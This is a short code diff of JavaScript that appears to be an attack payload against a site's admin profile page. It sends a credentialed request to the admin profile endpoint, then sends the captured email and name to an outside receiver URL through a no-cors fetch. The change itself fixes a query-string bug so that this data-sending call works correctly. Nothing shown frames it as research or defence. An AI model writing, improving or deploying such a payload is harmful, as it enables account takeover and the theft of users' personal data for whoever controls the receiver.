@@ -84,7 +84,7 @@ fetch("https://ideaspies.com/user/admin/profile", {
 	  "credentials": "include"
 	});
 }).then(function (response) {
-	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName + '?complete=true', {'mode':'no-cors'});
+	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName + '&complete=true', {'mode':'no-cors'});
 }).then(function (response) {	
 }).catch(function (err) {
 });
